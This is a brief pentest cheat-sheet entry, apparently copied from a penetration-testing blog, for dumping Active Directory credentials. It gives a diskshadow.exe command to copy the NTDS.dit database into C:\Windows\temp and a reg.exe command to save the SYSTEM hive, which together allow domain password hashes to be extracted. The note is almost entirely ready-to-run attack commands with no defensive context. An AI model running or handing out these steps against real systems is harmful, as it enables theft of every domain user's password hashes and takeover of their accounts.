# DiskShadowCopyNtds.dit

Comes from https://pentestlab.blog/tag/ntds-dit/

To copy the NTDS.dit file to C:\Windows\temp, run:

diskshadow.exe /s c:\windows\temp\diskshadow.txt

To extract password hashes, you will also get an extract of SYSTEM from the registry:

reg.exe save hklm\system c:\windows\temp\reg.bak